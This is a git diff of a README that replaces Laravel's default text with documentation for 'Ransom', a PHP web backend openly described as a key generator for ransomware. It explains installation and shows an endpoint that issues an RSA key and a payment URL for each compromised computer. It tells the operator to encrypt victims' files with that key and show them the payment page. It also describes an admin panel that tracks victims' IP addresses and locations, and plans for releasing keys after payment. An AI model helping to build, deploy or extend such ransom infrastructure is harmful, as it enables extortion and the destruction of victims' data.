@@ -1,40 +1,63 @@
-<p align="center"><img src="https://laravel.com/assets/img/components/logo-laravel.svg"></p>
+<p align="center"><img src="https://i.imgur.com/zShH9AO.png"></p>
 
-<p align="center">
-<a href="https://travis-ci.org/laravel/framework"><img src="https://travis-ci.org/laravel/framework.svg" alt="Build Status"></a>
-<a href="https://packagist.org/packages/laravel/framework"><img src="https://poser.pugx.org/laravel/framework/d/total.svg" alt="Total Downloads"></a>
-<a href="https://packagist.org/packages/laravel/framework"><img src="https://poser.pugx.org/laravel/framework/v/stable.svg" alt="Latest Stable Version"></a>
-<a href="https://packagist.org/packages/laravel/framework"><img src="https://poser.pugx.org/laravel/framework/license.svg" alt="License"></a>
-</p>
+# About Ransom
 
-## About Laravel
+Ransom is a key generator for your ransomware. We generate RSA keys via your identifier, and then send it back to your program. 
 
-Laravel is a web application framework with expressive, elegant syntax. We believe development must be an enjoyable, creative experience to be truly fulfilling. Laravel attempts to take the pain out of development by easing common tasks used in the majority of web projects, such as:
 
-- [Simple, fast routing engine](https://laravel.com/docs/routing).
-- [Powerful dependency injection container](https://laravel.com/docs/container).
-- Multiple back-ends for [session](https://laravel.com/docs/session) and [cache](https://laravel.com/docs/cache) storage.
-- Expressive, intuitive [database ORM](https://laravel.com/docs/eloquent).
-- Database agnostic [schema migrations](https://laravel.com/docs/migrations).
-- [Robust background job processing](https://laravel.com/docs/queues).
-- [Real-time event broadcasting](https://laravel.com/docs/broadcasting).
+#Installing
 
-Laravel is accessible, yet powerful, providing tools needed for large, robust applications. A superb combination of simplicity, elegance, and innovation give you tools you need to build any application with which you are tasked.
+To install, open the .env file and edit the following lines:
 
-## Learning Laravel
+    DB_CONNECTION=mysql
+    DB_HOST=127.0.0.1
+    DB_PORT=3306
+    DB_DATABASE=ransom
+    DB_USERNAME=root
+    DB_PASSWORD=
 
-Laravel has the most extensive and thorough documentation and video tutorial library of any modern web application framework. The [Laravel documentation](https://laravel.com/docs) is thorough, complete, and makes it a breeze to get started learning the framework.
+Those values must corespond with your database information. Now run the following command:
 
-If you're not in the mood to read, [Laracasts](https://laracasts.com) contains over 900 video tutorials on a range of topics including Laravel, modern PHP, unit testing, JavaScript, and more. Boost the skill level of yourself and your entire team by digging into our comprehensive video library.
+    php artisan migrate
+    
+That command will create all of the tables for you.
 
-## Contributing
 
-Thank you for considering contributing to the Laravel framework! The contribution guide can be found in the [Laravel documentation](http://laravel.com/docs/contributions).
+#Generating keys
 
-## Security Vulnerabilities
+When we generate keys, we get the identifier you send to the system and AES encrypt it, and send you back the encryption key. We send the payment url and rsa key, for example visit: http://mysite.com/rsa/(identifier) replace the `(identifier)` with the id you generated for the compromised computer, and you will get the following json response back:
 
-If you discover a security vulnerability within Laravel, please send an e-mail to Taylor Otwell at taylor@laravel.com. All security vulnerabilities will be promptly addressed.
+    {"rsa":"eyJpdiI6IjBXXC9ocXc4YUhrb3ArWGpadzR1b3NBPT0iLCJ2YWx1ZSI6IjhUaEl1NmM1aUFUSVoxdk13cGpWcWc9PSIsIm1hYyI6IjhmNTY3NTQ4ZjcyZGQ5MmU1NDI1ZTQ0ZDYyNTA3OGY4ZWYxODkwZjhkNzE5ODEwZWIzYTE2MDBmMjg0M2I1NmEifQ==","url":"http:\/\/mysite.com\/payment\/pay\/34543"}
+    
+    
+You can then encrypt their files with the rsa key, and display the payment URL to them. 
 
-## License
 
-The Laravel framework is open-sourced software licensed under the [MIT license](http://opensource.org/licenses/MIT).
+#Updates
+
+At the moment, we do not accept payments, it's been a while since using Bitcoin, and all API's require verification, I may use an RPC client, but that will require a VPS to run the bitcoin daemon on. 
+
+We plan on seperating the systems, too. God forbid, the site was comprimised, your keys would be on the same site as the payments, so we plan on having the payment gateway and the key generator seperate.
+
+
+#Backened
+
+We have a register and login system, so you can register an account (an admin account) and then disable the registeration so no one else can register. To register visit:
+
+     http://mysite.com/auth/sign-up
+     
+You will then be redirectred to the admin panel, where you can view the Keys, when they were created and in what country/state and by what IP.
+
+To login, simply visit
+
+    http://mysite.com/auth/sign-in
+ 
+With the details you created on the register page.
+
+
+
+#Plans
+
+- Heat map in the admin panel to see what country/region/state has the moest encrypted harddrives.
+- Manually accept a payment in the admin panel, so click the paid for button and their key will be released
+
